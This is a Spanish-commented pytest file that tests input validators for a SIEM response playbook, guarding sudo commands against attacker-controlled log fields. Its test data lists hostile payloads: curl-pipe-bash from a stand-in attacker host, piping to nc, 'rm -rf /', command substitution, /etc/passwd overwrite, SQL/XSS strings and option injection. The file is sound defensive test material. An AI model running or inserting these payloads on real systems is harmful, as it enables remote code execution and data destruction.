"""Validadores de entrada no confiable (`siem_validators`) — hallazgo S-01.

Son la barrera entre un log controlado por el atacante y un comando que el
analista va a copiar en una terminal con `sudo`. Se prueban por separado del
clasificador porque su corrección tiene que poder auditarse sola.
"""

from __future__ import annotations

import pytest

from siem_validators import (
    IP_DESCONOCIDA,
    resolver_ip_atacante,
    safe_token,
    valid_ip,
    valid_username,
)

# Payloads que alteran la ESTRUCTURA de un comando (metacaracteres de shell).
# Los detecta `safe_token`, además de los validadores.
PAYLOADS_SHELL = [
    "victima; curl http://atacante/x.sh | bash",
    "bob && rm -rf /",
    "bob$(whoami)",
    "bob`id`",
    "bob | nc atacante 4444",
    "bob\nrm -rf /",
    "bob > /etc/passwd",
    "bob bob",            # el espacio parte el comando en dos argumentos
    "'; DROP TABLE x; --",
    "1');alert(document.cookie);//",
]

# Payloads que NO llevan metacaracteres y por eso `safe_token` los da por buenos:
# su peligro es de otra clase (inyección de opciones, path traversal) y lo cubre
# la forma que exige cada validador — `valid_username` no admite un `-` inicial
# ni una `/`. Que estén separados es a propósito: hace visible que cada barrera
# ataja una cosa distinta, y que ninguna alcanza sola.
PAYLOADS_DE_FORMA = [
    "../../etc/passwd",
    "-l",                 # opción de passwd disfrazada de usuario
    "--help",
    "--stdin",
]

# Todo lo que los validadores tienen que rechazar, venga por donde venga.
PAYLOADS = PAYLOADS_SHELL + PAYLOADS_DE_FORMA


# ─── valid_ip ────────────────────────────────────────────────────────────────

@pytest.mark.parametrize("valor", [
    "172.18.0.3", "10.0.0.1", "8.8.8.8", "203.0.113.50",
    "::1", "2001:db8::1", "  192.168.1.1  ",
])
def test_valid_ip_acepta_ips_reales(valor):
    assert valid_ip(valor) is not None


@pytest.mark.parametrize("valor", [
    *PAYLOADS,
    "1.2.3.4.5", "999.1.1.1", "1.2.3", "localhost", "no-es-una-ip",
    "", "   ", None, 42, ["1.2.3.4"], {"ip": "1.2.3.4"},
    "1.2.3.4; rm -rf /", "1.2.3.4 || true",
])
def test_valid_ip_rechaza_todo_lo_demas(valor):
    assert valid_ip(valor) is None


def test_valid_ip_canonicaliza():
    """Devuelve la forma canónica, no el texto de entrada."""
    assert valid_ip("  10.0.0.1  ") == "10.0.0.1"
    assert valid_ip("2001:0db8:0000::1") == "2001:db8::1"


# ─── valid_username ──────────────────────────────────────────────────────────

@pytest.mark.parametrize("valor", [
    "testuser", "root", "_daemon", "web-admin", "user.name", "a", "A1",
    "u" * 32,
])
def test_valid_username_acepta_nombres_posix(valor):
    assert valid_username(valor) == valor


@pytest.mark.parametrize("valor", [
    *PAYLOADS,
    "1user",          # no puede empezar con dígito
    "u" * 33,         # excede 32
    "", "   ", None, 42, ["bob"],
])
def test_valid_username_rechaza_lo_demas(valor):
    assert valid_username(valor) is None


def test_valid_username_nunca_empieza_con_guion():
    """Un nombre que empieza con `-` se leería como una opción del comando.

    `sudo passwd -l` bloquea una cuenta; `sudo passwd --stdin` cambia el modo de
    lectura. El validador lo impide en el primer carácter.
    """
    for valor in ("-l", "--stdin", "-rf"):
        assert valid_username(valor) is None


# ─── safe_token ──────────────────────────────────────────────────────────────

@pytest.mark.parametrize("valor", PAYLOADS_SHELL)
def test_safe_token_detecta_los_payloads_de_shell(valor):
    """Segunda barrera, independiente: si un validador se relajara, esto lo ve."""
    assert safe_token(valor) is False


@pytest.mark.parametrize("valor", PAYLOADS_DE_FORMA)
def test_safe_token_no_alcanza_solo(valor):
    """Documenta el límite de `safe_token`: mira estructura, no semántica.

    `-l` y `../../etc/passwd` no tienen metacaracteres, así que pasan esta
    barrera. Los ataja `valid_username` por su forma. Escrito como prueba para
    que nadie use `safe_token` como si fuera un validador completo.
    """
    assert safe_token(valor) is True
    assert valid_username(valor) is None


@pytest.mark.parametrize("valor", ["172.18.0.3", "testuser", "web-admin", "user.name"])
def test_safe_token_acepta_valores_ya_validados(valor):
    assert safe_token(valor) is True


def test_safe_token_rechaza_vacios_y_no_strings():
    for valor in ("", None, 42, [], {}):
        assert safe_token(valor) is False


def test_los_validadores_y_safe_token_coinciden():
    """Todo lo que pasa un validador tiene que pasar `safe_token`.

    Si esta invariante se rompe, hay un valor que el playbook aceptaría y que
    aun así podría alterar la estructura de un comando.
    """
    for valor in [*PAYLOADS, "172.18.0.3", "testuser", "::1", "user.name", "1.2.3.4.5"]:
        if valid_ip(valor) is not None:
            assert safe_token(valid_ip(valor))
        if valid_username(valor) is not None:
            assert safe_token(valid_username(valor))


# ─── resolver_ip_atacante ────────────────────────────────────────────────────

def test_resolver_usa_la_primera_ip_valida():
    assert resolver_ip_atacante(["172.18.0.3", "10.0.0.1"]) == "172.18.0.3"


def test_resolver_cae_al_respaldo_cuando_la_lista_esta_vacia():
    """Es la corrección de L-03: la IP estaba en `source_ip` y se ignoraba."""
    assert resolver_ip_atacante([], "172.18.0.3") == "172.18.0.3"


def test_resolver_saltea_valores_invalidos():
    assert resolver_ip_atacante(["no-es-ip", "x; rm -rf /", "10.0.0.1"]) == "10.0.0.1"


def test_resolver_ignora_el_sentinela_desconocida():
    assert resolver_ip_atacante([IP_DESCONOCIDA], IP_DESCONOCIDA) is None


def test_resolver_devuelve_none_cuando_no_hay_nada():
    """`None` es una respuesta legítima: significa 'no hay IP que bloquear'."""
    assert resolver_ip_atacante([], None) is None
    assert resolver_ip_atacante(None, None) is None
    assert resolver_ip_atacante(["basura"], "más basura") is None


def test_resolver_acepta_una_ip_suelta():
    assert resolver_ip_atacante("172.18.0.3") == "172.18.0.3"
